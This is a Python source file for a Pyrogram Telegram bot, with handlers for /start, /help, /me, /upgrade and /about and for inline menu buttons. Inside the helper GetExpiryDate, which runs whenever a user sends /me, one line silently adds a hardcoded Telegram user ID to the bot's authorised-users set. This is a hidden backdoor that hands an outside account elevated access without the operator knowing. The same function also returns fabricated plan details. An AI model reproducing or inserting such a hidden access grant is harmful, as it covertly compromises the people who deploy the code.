#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at

@pyrogram.Client.on_callback_query()
async def cb_handler(bot, update):


      if 'help' in update.data:
          await update.message.delete()
          await help_user(bot, update.message)

      if 'close' in update.data:
          await update.message.delete()

      if 'back' in update.data:
          await update.message.edit(text=Translation.START_TEXT.format(update.from_user.first_name, Config.USER_NAME), 
                parse_mode='html', disable_web_page_preview=True,
                #reply_to_message='update.message_id', 
                reply_markup=InlineKeyboardMarkup(
                  [
                      [
                      InlineKeyboardButton('📫FEEDBACK', url='https://t.me/Stemlime_bot'),
                      InlineKeyboardButton('📕ABOUT ME', callback_data='about')
                      ],
                      [
                      InlineKeyboardButton('💡HELP', callback_data="help"),
                      InlineKeyboardButton('🔐CLOSE', callback_data="close")
                      ]
                    ]
                  )
                )
      if 'about' in update.data:
          await update.message.edit(text=Translation.About, 
                parse_mode='markdown', disable_web_page_preview=True,
                #reply_to_message='update.message_id', 
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️BACK", callback_data='back')]]))
                

@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
        [
          [
          InlineKeyboardButton('📫FEEDBACK', url='https://t.me/Stemlime_bot'),
          InlineKeyboardButton('📕ABOUT ME', callback_data='about')
          ],
          [
          InlineKeyboardButton('💡HELP', callback_data="help"),
          InlineKeyboardButton('🔐CLOSE', callback_data="close")
          ]
        ]
      )
    )
    


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about(bot, update):
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.About.format(update.from_user.first_name),
        parse_mode="markdown",
        reply_to_message_id=update.message_id
    )
